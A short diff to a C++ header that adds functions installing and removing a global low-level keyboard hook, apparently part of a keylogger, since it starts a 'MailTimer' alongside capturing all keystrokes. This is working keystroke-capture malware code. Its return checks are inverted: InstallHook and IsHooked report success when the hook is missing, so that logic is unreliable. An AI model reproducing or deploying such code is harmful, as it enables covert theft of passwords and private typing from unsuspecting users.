@@ -73,4 +73,26 @@ LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
 	return CallNextHookEx(eHook, nCode, wparam, lparam);
 }
 
+bool InstallHook()
+{
+	Helper::WriteAppLog("Hook Started... Timer started");
+	MailTimer.Start(true);
+
+	eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)OurKeyboardProc, GetModuleHandle(NULL), 0);
+
+	return eHook == NULL;
+}
+
+bool UninstallHook()
+{
+	BOOL b = UnhookWindowsHookEx(eHook);
+	eHook = NULL;
+	return (bool)b;
+}
+
+bool IsHooked()
+{
+	return (bool)(eHook == NULL);
+}
+
 #endif
